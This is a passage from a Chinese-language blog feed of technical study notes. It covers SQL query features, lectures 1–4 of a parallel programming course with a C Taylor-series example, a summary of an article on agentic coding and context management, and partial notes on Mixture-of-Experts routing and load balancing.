<strong><u>聚合计算后</u></strong>。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260117182730554.png" alt="image-20260117182730554" style="zoom:50%;" /></p><p>这表明 HAVING 在 SELECT 之前发生，因此 avg_gpa 名称尚未生成。</p><h2 id="字符串操作">字符串操作</h2><ul><li><strong>LIKE</strong> 提供带有特殊匹配运算符的字符串匹配：<ul><li>‘%’ 匹配任何子字符串（包括空字符串）</li><li>’_’ 匹配任何一个字符</li></ul></li><li><strong>SIMILAR TO</strong> 允许进行正则表达式匹配<ul><li>在 SQL 标准中，但并非所有系统都支持</li><li>其他系统也支持 POSIX 风格的正则表达式</li></ul></li><li><strong>SUBSTRING</strong></li><li><strong>UPPER</strong></li><li><strong>||</strong> : 连接两个或多个字符串（这也可以是 + 或 CONCAT()函数）</li></ul><h2 id="日期时间操作">日期/时间操作</h2><p>日期/时间操作处理时间值，语法和行为因 DBMS 而异。</p><h2 id="输出控制"><strong>输出控制</strong></h2><p>输出控制子句决定查询返回的行的顺序和数量。</p><ul><li><strong>ORDER BY</strong>: <u>ORDER BY column [ASC | DESC]</u>按一个或多个列的值对元组进行排序</li><li><strong>FETCH</strong>: <u>FETCH {FIRST|NEXT} &lt;#&gt; ROWS OFFSET&lt;#&gt; ROWS</u><ul><li>限制输出中返回的元组数量</li><li>可以设置偏移量以返回“范围”</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260117184442310.png" alt="image-20260117184442310" style="zoom:40%;" /></p><h2 id="输出重定向">输出重定向</h2><p>将查询结果存储在另一个表中：</p><ul><li>表必须尚未定义</li><li>表将具有与输入相同数量的列和相同类型</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260117184804759.png" alt="image-20260117184804759" style="zoom:33%;" /></p><h2 id="嵌套查询">嵌套查询</h2><p>在另一个查询中调用查询以组合更复杂的计算：</p><blockquote><p>内部查询几乎可以出现在查询的任何地方</p></blockquote><ul><li>ALL: 表达式必须对子查询中的所有行都为真。</li><li>ANY: 表达式必须对子查询中的至少一行为真。</li><li>IN: 等同于 ‘<strong>=ANY()</strong>’。</li><li>EXISTS: 至少返回一行，而不与外部查询中的属性进行比较。</li></ul><h2 id="侧向连接">侧向连接</h2><p>侧向运算符允许嵌套查询引用在其之前的其他嵌套查询中的属性（根据在查询中的位置）。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260117211328677.png" alt="image-20260117211328677" style="zoom:40%;" /></p><h2 id="公共表表达式">公共表表达式</h2><p>指定一个临时结果集，然后可以在查询的其他部分引用该结果集。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260117211619436.png" alt="image-20260117211619436" style="zoom:40%;" /></p><h2 id="窗口函数">窗口函数</h2><p>在与当前元组相关的一组元组上执行计算，而不将它们合并为单个输出元组，以支持运行总计、排名和移动平均。</p><p>特殊窗口函数：</p><ul><li>ROW_NUMBER() 当前行的编号</li><li>RANK() 当前行的排序位置</li></ul><blockquote><p><strong>OVER</strong>关键字指定在计算窗口函数时如何对元组进行分组。</p><p>使用 <strong>PARTITION BY</strong> 指定分组。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CMU 15-645 数据库系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMU </tag>
            
            <tag> Study Notes </tag>
            
            <tag> Database Systems </tag>
            
            <tag> Database </tag>
            
            <tag> 15645 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>15618 Parallel Programming Lecture (1-4) Notes</title>
      <link href="/zh/2026/01/16/15618-Parallel-Programming/15618-Parallel-Programming-Lecture-Notes/"/>
      <url>/zh/2026/01/16/15618-Parallel-Programming/15618-Parallel-Programming-Lecture-Notes/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="lec-1-为什么并行性为什么效率">Lec 1为什么并行性？为什么效率？</h1><h2 id="处理器性能的简要历史">处理器性能的简要历史</h2><ul><li><p>更宽的数据通道（位宽）</p></li><li><p>更高效的流水线（3.5 指令周期（CPI）→ 1.1 CPI）</p></li><li><p>指令级并行性（ILP），例如 <strong>超标量</strong> 处理</p></li><li><p>更快的时钟频率（<strong>最重要</strong>），例如 10 MHz → 200 MHz→ 3 GHz</p></li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260115123917522.png" alt="image-20260115123917522" style="zoom: 33%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260115124003572.png" alt="image-20260115124003572" style="zoom: 33%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260115124019432.png" alt="image-20260115124019432" style="zoom:33%;" /></p><h2 id="什么是并行计算机">什么是并行计算机？</h2><p>一个常见的定义：</p><p>并行计算机是一个 <strong>处理元素的集合</strong>，它们<strong>合作</strong> 以 <strong>快速解决问题</strong>。 <spanclass="math display">\[加速比（使用\ P\ 处理器） = \frac{执行时间（使用\ 1\处理器）}{执行时间（使用\ P\ 处理器）}\]</span> 关于加速比的一些观察：</p><ul><li>通信限制了实现的最大加速比（可能 <strong>主导</strong>并行计算）</li><li>最小化通信成本可以提高加速比</li><li>工作分配不均衡限制了加速比</li><li>改善工作分配可以提高加速比</li></ul><h2 id="cpu-设计哲学的转变">CPU 设计哲学的转变</h2><p>最大化 <strong>性能</strong>（ILP）→ 最大化<strong>每单位面积的性能</strong>（每芯片的性能）→ 最大化<strong>每瓦特的性能</strong></p><p><u>总结</u>：主要关注 <strong>核心的效率</strong></p><hr /><h1 id="lec-2-现代多核处理器">Lec 2 现代多核处理器</h1><h2 id="并行执行">并行执行</h2><p><strong>使用泰勒展开计算 sin(x)</strong>：sin(x) = x - x³/3! + x⁵/5!- x⁷/7! + …</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sinx</span><span class="params">(<span class="type">int</span> N, <span class="type">int</span> terms, <span class="type">float</span>* x, <span class="type">float</span>* result)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;N; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">float</span> value = x[i];</span><br><span class="line">        <span class="type">float</span> numer = x[i] * x[i] * x[i];</span><br><span class="line">        <span class="type">int</span> denom = <span class="number">6</span>;  <span class="comment">// 3!</span></span><br><span class="line">        <span class="type">int</span> sign = <span class="number">-1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>; j&lt;=terms; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            value += sign * numer / denom;</span><br><span class="line">            numer *= x[i] * x[i];</span><br><span class="line">            denom *= (<span class="number">2</span>*j+<span class="number">2</span>) * (<span class="number">2</span>*j+<span class="number">3</span>);</span><br><span class="line">            sign *= <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        result[i] = value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提高程序效率的思路如下。</p><h3 id="多核">多核</h3><p>利用不断增加的晶体管数量为处理器添加更多核心</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260115141242348.png" alt="image-20260115141242348" style="zoom: 33%;" /></p><h3 id="更多-alu">更多 ALU</h3><p>在多个 ALU 上摊销管理指令流的成本/复杂性</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260115141328877.png" alt="image-20260115141328877" style="zoom:40%;" /></p><div class="note info flat"><p><strong>SIMD 处理</strong>（单指令，多数据）：相同指令广播到所有ALU，并在所有 ALU 上并行执行</p></div><p><strong>标量程序与向量程序</strong>：标量：每个寄存器一个操作。向量：使用SIMD 每个寄存器多个操作。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260115141737878.png" alt="image-20260115141737878" style="zoom:33%;" /></p><p>上图显示条件代码（if - else）可能会 <strong>降低</strong> 多 ALU架构的效率。因为<strong>同一处理器中只能同时执行一条指令</strong>，所以可能有一些 ALU处于空闲状态，我们使用 <strong>掩码来丢弃某些 ALU 的输出</strong>。</p><h3 id="simd-术语">SIMD 术语</h3><p><strong>指令流一致性与分歧执行</strong></p><ul><li><strong>一致性执行</strong>：所有元素同时执行相同的指令序列（对 SIMD高效）</li><li><strong>分歧执行</strong>：不同元素需要不同的指令路径（对 SIMD低效，例如 if-else 分支）</li></ul><p><strong>SSE 与 AVX</strong></p><ul><li><strong>SSE</strong>：128 位操作（4 宽浮点向量）</li><li><strong>AVX</strong>：256 位操作（8 宽浮点向量）</li></ul><p><strong>显式 SIMD 与隐式 SIMD</strong></p><ul><li><strong>显式 SIMD</strong>：程序员显式编写 SIMD代码，使用内建函数或并行结构；向量化在编译时完成</li><li><strong>隐式SIMD（自动向量化）</strong>：编译器自动检测并将标量循环转换为 SIMD指令</li></ul><h3 id="总结">总结</h3><p><strong>多核</strong></p><ul><li><strong>什么</strong>：多个核心同时执行不同线程</li><li><strong>控制</strong>：程序员创建线程（例如 pthreads）</li><li><strong>并行性</strong>：线程级并行性</li></ul><p><strong>SIMD</strong></p><ul><li><strong>什么</strong>：单指令对多个数据元素操作</li><li><strong>控制</strong>：编译器（显式 SIMD）或硬件（隐式）</li><li><strong>并行性</strong>：数据级并行性</li></ul><p><strong>超标量</strong></p><ul><li><strong>什么</strong>：同一线程的多条指令并行执行</li><li><strong>控制</strong>：硬件在运行时自动发现并行性</li><li><strong>并行性</strong>：指令级并行性（ILP）</li><li><strong>注意</strong>：本课程未涵盖（属于架构课程，如 18-447）</li></ul><h2 id="访问内存">访问内存</h2><h3 id="停顿">停顿</h3><p>当处理器因依赖于先前指令而无法运行指令流中的下一条指令时，它会“<strong>停顿</strong>”。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260115142855628.png" alt="image-20260115142855628" style="zoom:40%;" /></p><p>减少停顿的方法：</p><ul><li><p><strong>预取</strong>：所有现代 CPU都有将数据预取到缓存的逻辑</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260115143654668.png" alt="image-20260115143654668" style="zoom: 50%;" /></p></li><li><p><strong>多线程</strong>：在同一核心上交错处理多个线程以隐藏停顿</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260115143214758.png" alt="image-20260115143214758" style="zoom: 33%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260115143626898.png" alt="image-20260115143626898" style="zoom: 33%;" /></p></li></ul><p>核心需要管理多个线程的执行上下文。以下是不同概念的计数方法示例。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260115143926553.png" alt="image-20260115143926553" style="zoom:33%;" /></p><h3 id="gpu-与-cpu">GPU 与 CPU</h3><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260115144059525.png" alt="image-20260115144059525" style="zoom: 33%;" /></p><h3 id="带宽限制">带宽限制</h3><p>由于现代芯片的 <strong>高算术能力</strong>，许多并行应用（在 CPU 和GPU 上）都受限于带宽。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260115144345891.png" alt="image-20260115144345891" style="zoom: 33%;" /></p><h1 id="lec-3-并行编程抽象">Lec 3 并行编程抽象</h1><h2 id="intel-spmd-程序编译器ispc">Intel SPMD 程序编译器（ISPC）</h2><p>SPMD 指的是单程序多数据，调用 ISPC 函数会生成 ISPC 的 “<u>帮派</u>”“<u>编程实例</u>（SIMD 通道）”。所有实例并发运行 ISPC 代码。</p><blockquote><p>帮派是向量宽度级别的概念</p></blockquote><h3 id="交错版本">交错版本</h3><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260116095110149.png" alt="image-20260116095110149" style="zoom:33%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260116095416655.png" alt="image-20260116095416655" style="zoom:33%;" /></p><h3 id="阻塞版本">阻塞版本</h3><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260116100317569.png" alt="image-20260116100317569" style="zoom:33%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260116100327583.png" alt="image-20260116100327583" style="zoom:33%;" /></p><blockquote><p><strong>哪个更快？</strong> 答：<strong>交错</strong> 的更快。</p><p>交错版本使用 **_mm_load_ps1** 加载这些连续数据，而阻塞版本需要使用**_mm_i32gather**，这更复杂且更慢。</p></blockquote><blockquote><p>对于ISPC，我们不能将一个变化的数字与一个统一的数字相加，编译时会拒绝该代码。</p></blockquote><h2 id="四种通信模型">四种通信模型</h2><h3 id="共享地址空间结构非常少">共享地址空间：结构非常少</h3><p>线程通过</p><ul><li>读取/写入共享变量。</li><li>操作同步原语</li></ul><blockquote><p>同步原语也是共享变量。例如，锁、信号量</p></blockquote><p><strong>共享地址空间的硬件实现</strong></p><p>关键思想：任何处理器都可以 <u><strong>直接</strong></u>访问任何内存位置</p><ul><li><p>对称（共享内存）多处理器（<strong>SMP</strong>）：统一的内存访问时间</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260116113230688.png" alt="image-20260116113230688" style="zoom: 33%;" /></p></li><li><p>非统一内存访问（<strong>NUMA</strong>）：所有处理器都可以访问任何内存位置，但内存访问的成本对处理器而言是不同的。</p><figure><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260116113407652.png"alt="image-20260116113407652" /><figcaption aria-hidden="true">image-20260116113407652</figcaption></figure></li></ul><blockquote><p>统一：成本是统一的，但都是统一的坏</p><p>NUMA：更具可扩展性</p></blockquote><h3 id="消息传递高度结构化的通信">消息传递：高度结构化的通信</h3><p>线程在自己的私有空间内操作，通过<strong><u>发送/接收消息</u></strong> 进行通信</p><p>流行的软件库：<strong>MPI（消息传递接口）</strong></p><blockquote><p>编程模型和硬件架构之间并没有一一对应关系：消息传递可以在共享内存硬件上实现，而共享内存抽象可以在没有硬件支持的机器上模拟，通常会有性能权衡。</p></blockquote><h3 id="数据并行非常严格的计算结构">数据并行：非常严格的计算结构</h3><p>数据并行编程将独立计算映射到大数据集合上；通过限制通信和副作用，它使简单推理和高性能实现成为可能，尽管不规则访问模式如<strong><u>聚集/散布</u></strong> 成本较高。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260116115517345.png" alt="image-20260116115517345" style="zoom: 33%;" /></p><h3 id="脉动阵列">脉动阵列</h3><p><u>目标领域</u>：数据密集型应用，其中 <strong>内存带宽</strong> 是<strong>瓶颈</strong>。</p><p>由于内存带宽是关键资源，因此我们确实希望<strong>避免不必要的内存访问</strong>。因此，我们需要<strong>在处理器上执行所有必要的计算</strong>，然后再写回任何结果，通常通过<strong>在处理器之间直接流水线中间结果</strong>。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260116120138219.png" alt="**image-20260116120138219**" style="zoom: 33%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260116120212339.png" alt="image-20260116120212339" style="zoom:33%;" /></p><blockquote><p>现代实践：混合编程模型</p><p>在集群的 <u>多核节点</u> 内使用 <u>共享地址空间</u>编程，在节点之间使用 <u>消息传递</u>。</p></blockquote><h1 id="lec-4-并行编程基础">Lec 4 并行编程基础</h1><h2 id="创建并行程序">创建并行程序</h2><p>思考过程：</p><ol type="1"><li>确定可以并行执行的工作</li><li>划分工作（以及与工作相关的数据）</li><li>管理 <strong>数据访问</strong>、<strong>通信</strong> 和<strong>同步</strong></li></ol><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260121094725347.png" alt="image-20260121094725347" style="zoom:35%;" /></p><h3 id="分解">分解</h3><p>将问题分解为可以 <strong><u>并行执行的任务</u></strong></p><p><strong>主要思想</strong>：创建至少足够的任务以保持机器上所有执行单元的忙碌。</p><p><strong>阿姆达尔定律</strong>：依赖关系限制了由于并行性而实现的最大加速比。然后<strong><u>由于并行执行的最大加速比 &lt;= 1 / S</u></strong>。 <spanclass="math display">\[\text{加速比} \leq \frac{1}{s + \frac{1-s}{p}}\]</span></p><h3 id="分配">分配</h3><p>将任务分配给线程</p><p><strong><u>目标</u></strong>：平衡工作负载，减少通信成本</p><h3 id="协调">协调</h3><ul><li>结构化通信</li><li>添加同步以在必要时保留依赖关系</li><li>在内存中组织数据结构</li><li>调度任务</li></ul><p><strong><u>目标</u></strong>：减少<strong>通信/同步成本</strong>，保留数据引用的<strong>局部性</strong>，减少 <strong>开销</strong> 等。</p><h3 id="映射到硬件">映射到硬件</h3><p>将“线程”（“工作者”）映射到硬件执行单元</p><ul><li>通过 <strong><u>操作系统</u></strong> 映射（例如，将 pthread 映射到CPU 核心上的硬件执行上下文）</li><li>通过 <strong><u>编译器</u></strong> 映射（将 ISPC程序实例映射到向量指令通道）</li><li>通过 <strong><u>硬件</u></strong> 映射（将 CUDA 线程块映射到 GPU核心）</li></ul>]]></content>
      
      
      <categories>
          
          <category> CMU 15-618 并行编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMU </tag>
            
            <tag> Study Notes </tag>
            
            <tag> Parallel Programming </tag>
            
            <tag> 15618 </tag>
            
            <tag> Systems </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用第一性原理拆解 Agentic Coding：从理论到实操</title>
      <link href="/zh/2026/01/12/Personal/Deconstructing%20Agentic%20Coding%20with%20First%20Principles:%20From%20Theory%20to%20Practice/"/>
      <url>/zh/2026/01/12/Personal/Deconstructing%20Agentic%20Coding%20with%20First%20Principles:%20From%20Theory%20to%20Practice/</url>
      
        <content type="html"><![CDATA[<h1id="深度总结agentic-coding-的第一性原理与工程化实践">深度总结：AgenticCoding 的第一性原理与工程化实践</h1><h3 id="一-核心矛盾ai-的有限内存与无限任务">一、 核心矛盾：AI的“有限内存”与“无限任务”</h3><p>Agentic Coding 的本质是让 LLM 使用工具来完成编程任务。但目前所有的Agent都面临一个物理天花板：<strong>上下文窗口的稀缺性与指令饱和度</strong>。</p><ul><li><strong>指令饱和度限制</strong>：研究表明，前沿模型大约只能可靠遵循<strong>150-200 条指令</strong>。</li><li><strong>系统提示词占用</strong>：Agent系统的配置（如环境感知、工具定义）往往已占据 <strong>约 50条指令</strong>，导致用户自定义空间极其有限。</li><li><strong>Code Agent 普遍痛点</strong>：由于上下文膨胀，Agent容易陷入“幻觉循环”、忘记最初目标或在复杂的长任务中失控。</li></ul><h3 id="二-实现原理从-react-到强化学习-rl-的跃迁">二、 实现原理：从ReAct 到强化学习 (RL) 的跃迁</h3><p>博客深入探讨了 Agent 的底层运行逻辑，即如何将 LLM转化为一个能够“思考并执行”的实体：</p><ul><li><strong>规划与推理 (Planning &amp; Reasoning)</strong>：Agent采用类似 <strong>ReAct</strong> (Reason + Act)的模式，将任务拆解为可执行的原子操作。</li><li><strong>强化学习 (RL)的注入</strong>：通过强化学习训练，使其在面对工具调用失败时具备更好的<strong>自我修正能力</strong>。</li><li><strong>Prompt Caching（提示词缓存）：工程实践的关键</strong>：</li><li><strong>核心机制：前缀匹配 (PrefixMatching)</strong>：缓存基于前缀匹配，只有当新请求的<strong>开头部分</strong>与之前缓存的请求完全一致时，才能命中缓存。</li><li><strong>结构化组织方式</strong>：为了最大化命中率，Prompt必须按<strong>稳定性从高到低</strong>排列：<ol type="1"><li><strong>SystemPrompt</strong>（角色定义、行为准则）：稳定不变，最先缓存。</li><li><strong>Tool Definitions</strong>（工具 Schema定义）：稳定不变，可缓存。</li><li><strong>ProjectContext</strong>（项目说明、代码规范）：相对稳定，尽量少变。</li><li><strong>ConversationHistory</strong>（对话历史）：动态增长，放在最后，不影响前面三层的缓存命中。</li></ol></li></ul><h3 id="三-上下文管理从暴力全传到精细化运营">三、上下文管理：从“暴力全传”到“精细化运营”</h3><p>为了解决“会话间失忆”和 Token 爆炸，博客提出了精细的过滤策略：</p><ol type="1"><li><strong>Observation Masking（观察遮蔽）</strong>：<ul><li><strong>核心</strong>：保留关键的推理逻辑和行动指令，但用“内容已省略”替换掉冗长的工具返回结果（如海量日志或整段源码）。</li></ul></li><li><strong>LLM Summarization（摘要化）</strong>：<ul><li><strong>深度见解</strong>：利用模型动态压缩历史。虽然解决了长度问题，但需警惕细节丢失导致的“决策漂移”。</li></ul></li><li><strong>任务拆解与短对话模式</strong>：<ul><li><strong>核心</strong>：核心策略是采用<strong>“短对话、精简上下文”</strong>模式，将复杂任务拆解为专注的子对话，避免单次会话过长导致的性能下降。</li></ul></li></ol><h3 id="四-开发者体验-dx为-ai-打造复利工程">四、 开发者体验 (DX)：为 AI打造“复利工程”</h3><p>博客中一个极具深度的观点是：<strong>改善开发者体验具有双重价值</strong>。</p><ul><li><strong>结构化外部记忆</strong>：<ul><li><strong>任务追踪</strong>：使用 Issue Tracker 或<code>TODO.md</code>，让进度在磁盘上“持久化”，解决会话重启后的失忆问题。</li><li><strong>固定位置记录决策</strong>：将核心架构决策（ADR）放在固定位置，而非淹没在对话历史中。</li></ul></li><li><strong>复利工程 (Compounding Engineering)</strong>：<ul><li>将 Bug修复、代码审查等日常经验沉淀为可复用的<strong>项目知识库</strong>。</li></ul></li><li><strong>环境投资</strong>：清晰的 README、快速的单元测试和自动化的Linter，对 AI 而言就是极佳的“外部索引”，能显著提升其表现。</li></ul><h3 id="五-避坑指南配置文件如-.cursorrules的正确姿势">五、避坑指南：配置文件（如 .cursorrules）的正确姿势</h3><ul><li><strong>精简配置文件</strong>：理想情况下只包含对所有任务普遍适用的内容，避免指令过载。</li><li><strong>按需读取 (On-demand Retrieval)</strong>：与其在 Prompt里塞满文档，不如提供良好的文档结构，让 Agent在需要时主动调用“读文件”工具。</li></ul><hr /><h3id="结语从解决问题向教育系统转变">结语：从“解决问题”向“教育系统”转变</h3><p>Agentic Coding正在从“对话模式”转向“工程模式”。通过不断实践，开发者可以成为驾驭 AI的<strong>“专家型通才”</strong>。</p><p>我们不应该把 Agent看作一个无所不能的黑盒，而应该把它看作一个拥有顶级理解力、但需要良好工程环境支撑的实习生。核心在于<strong>优化与AI的协作方式</strong>，而非寄希望于无限的上下文窗口。通过<strong>刻意练习</strong>这门技能，我们能让系统获得记忆，实现效率的持续增长。</p><p><ahref="https://mp.weixin.qq.com/s/Zlwn42KyfjgwfX6lp-JthQ">字节跳动技术团队：用第一性原理拆解Agentic Coding</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术见解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI Agent </tag>
            
            <tag> 技术博客 </tag>
            
            <tag> Code Agent </tag>
            
            <tag> 工程经验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CS336-Lec4 Mixture of Experts</title>
      <link href="/zh/2025/12/17/CS336/CS336-Lec4-Mixture-of-Experts/"/>
      <url>/zh/2025/12/17/CS336/CS336-Lec4-Mixture-of-Experts/</url>
      
        <content type="html"><![CDATA[<h1 id="cs336-lec4-mixture-of-experts">CS336-Lec4 Mixture ofExperts</h1><p>在现代的超大规模LLM的竞赛中，混合专家模型（Mixture of Experts,MoE）已经成为实现“万亿级参数量”与“可控计算成本”的核心技术。</p><h2 id="moe的核心定义">MoE的核心定义</h2><p>传统的Transformer模型是dense的，每个Token都会激活所有的参数。MoE的基本思想就是把巨大的FFN替换为多个并行的专家网络，然后增加一个路由层，决定Token进入哪个或哪些专家。</p><p><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251218010555148.png" /></p><p>MoE 层在位置 <span class="math inline">\(t\)</span> 的输出 <spanclass="math inline">\(\mathbf{h}_t^l\)</span>可以表示为被选中专家输出的加权总和 ： <span class="math display">\[\mathbf{h}_t^l = \sum_{i=1}^{N} \left( g_{i,t} \cdot \text{FFN}_i(\mathbf{u}_t^l) \right) + \mathbf{u}_t^l\]</span> 其中：</p><ul><li><span class="math inline">\(N\)</span> 是专家总数。</li><li><span class="math inline">\(\mathbf{u}_t^l\)</span> 是该层的输入Token 向量 。</li><li><span class="math inline">\(g_{i,t}\)</span>是由路由器计算的<strong>门控权重（Gating Weight）</strong>，通常通过<strong>Top-K 路由</strong> 计算 ，见下节。</li></ul><h2 id="路由机制">路由机制</h2><p>路由函数是MoE非常重要的部分，这一块决定了参数的利用效率，我们首先介绍一些路由机制可能的实现方式。大致可以按照需要Learning和不需要Learning两种：</p><ul><li>需要Learning的包括Top-K以及RL机制的路由</li><li>不需要Learning的包括Hash和Base Routing</li></ul><p>在这里先简单介绍一下不需要Learning的两种机制：</p><ul><li><strong>哈希路由 (Hash Routing)：</strong> 采用固定的哈希函数将Token 分配给专家 。因为路由是固定的，所以根本<strong>不需要学习</strong>Router 参数，自然也就没有不可微的问题了</li><li><strong>BASE 路由 (BASE Routing)：</strong>将路由决策转化为一个“<strong>线性分配问题</strong>（LinearAssignment）”来求解，试图找到最优的全局匹配 。</li></ul><p>但是目前大部分模型使用的都是ChooseTop-K，但Top-K也有以下几种变体。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251218011033467.png" style="zoom:40%;" /></p><h3 id="top-k-路由数学细节主流方案">Top-K 路由数学细节（主流方案）</h3><p>路由器首先计算 Token 与专家嵌入向量 <spanclass="math inline">\(e_i\)</span> 的相关性得分 <spanclass="math inline">\(s_{i,t}\)</span> ： <span class="math display">\[s_{i,t} = \text{Softmax}_i (\mathbf{u}_t^{lT} e_i^l)\]</span> 随后，通过 Top-K 算子实现稀疏激活 ： <spanclass="math display">\[g_{i,t} = \begin{cases} s_{i,t}, &amp; s_{i,t} \in \text{TopK}(\{s_{j,t}| 1 \le j \le N\}, K) \\ 0, &amp; \text{otherwise} \end{cases}\]</span><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251218011325691.png" alt="image-20251218011325691" style="zoom:60%;" /></p><h3 id="现代架构变体deepseekmoe">现代架构变体：DeepSeekMoE</h3><p>DeepSeek引入了更加精细化的设计用于提升MoE的效果：</p><ul><li><strong>细粒度(Fine-grained)的专家分割</strong>：将大专家拆分为多个小专家（如 <spanclass="math inline">\(2N\)</span> 个），允许更精确的知识组合。</li><li><strong>共享专家隔离 (Shared ExpertIsolation)</strong>：设置固定开启的专家，专门处理所有 Token共享的基础公共知识，减少路由专家的冗余 。</li></ul><p><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251218011738375.png" /></p><h2 id="训练的稳定性">训练的稳定性</h2><p>MoE的核心挑战在于如何稳定的训练。为了提高训练的效率，我们需要模型具备稀疏性，但是稀疏的门控机制（Top-K）是<strong>Non-differentiable</strong>的。而且，我们还需要保持专家间的负载均衡，如果不对Router进行约束，那流量集中在部分专家，导致剩下的得不到训练，成为“死专家”，我们有以下的Solutions去解决这个问题。</p><h3 id="强化学习-reinforcement-learning">强化学习 (ReinforcementLearning)</h3><p>其原理很简单，就是将整个Router视作一个智能体，将Token视为Action，利用强化学习的算法，根据最终的Loss（作为Reward）来优化route策略。</p><p>但其实这种方法<strong>并不常用</strong>，逻辑上正确，但是<strong>梯度方差极大且计算复杂</strong>，导致在大规模与训练中不如其他方案，不被广泛采纳。</p><h3 id="随机近似-stochastic-perturbations">随机近似 (StochasticPerturbations)</h3><p>原理就是在路由的Logits中加入<strong>高斯噪声</strong>（Gaussiannoise）或者是<strong>随机抖动</strong>（Jitter），强迫模型进行一些非常规的探索。<span class="math display">\[H(x)_i = (x \cdot W_g)_i + \text{StandardNormal}() \cdot\text{Softplus}((x \cdot W_{noise})_i)\]</span>即使这样的初始权重不好，随机性也会让每个专家都有机会得到训练，让Route变得更robust，避免了一些deadexpert的出现，</p><h3 id="辅助loss-auxiliary-loss">辅助Loss (Auxiliary Loss)</h3><p>为了让每个专家均匀分担任务，引入辅助Loss，意味着越频繁使用的专家收到的惩罚越严重，loss最小是任务平均分配到各专家：<span class="math display">\[\text{Loss}_{aux} = \alpha \cdot N \cdot \sum_{i=1}^N f_i \cdot P_i\]</span> 其中：</p><ul><li><span class="math inline">\(f_i\)</span> (分发比例)： 代表该 Batch中被分派到专家 <span class="math inline">\(i\)</span> 的 Token 比例。</li></ul><p><span class="math display">\[f_{i} = \frac{1}{T} \sum_{x \in \mathcal{B}} \mathbb{I}\{argmax \ p(x) =i\}\]</span></p><ul><li><span class="math inline">\(P_i\)</span> (路由概率比例)： 代表Router 分配给专家 <span class="math inline">\(i\)</span>的概率总和比例。</li></ul><p><span class="math display">\[P_{i} = \frac{1}{T} \sum_{x \in \mathcal{B}} p_{i}(x)\]</span></p><h3 id="deepseek的变体实现">DeepSeek的变体实现</h3><p><strong>DeepSeek v1-2 (专家与设备双重均衡)：</strong> 引入了<code>Per-expert</code> Loss（和SwitchTransfomer一致），确保专家之间平衡 。以及 <code>Per-device</code>Loss，确保跨 GPU 通信（All-to-All）也达到平衡 。</p><p><strong>DeepSeek v3 (无辅助损失均衡)</strong>： 引入了 Per-expertBias (<span class="math inline">\(b_i\)</span>) 机制： <spanclass="math display">\[S_{i,t}^{\prime} = \begin{cases} s_{i,t}, &amp; s_{i,t}+b_{i} \inTopk(\{s_{j,t}+b_{j} | 1 \le j \le N_{r}\}, K_{r}) \\ 0, 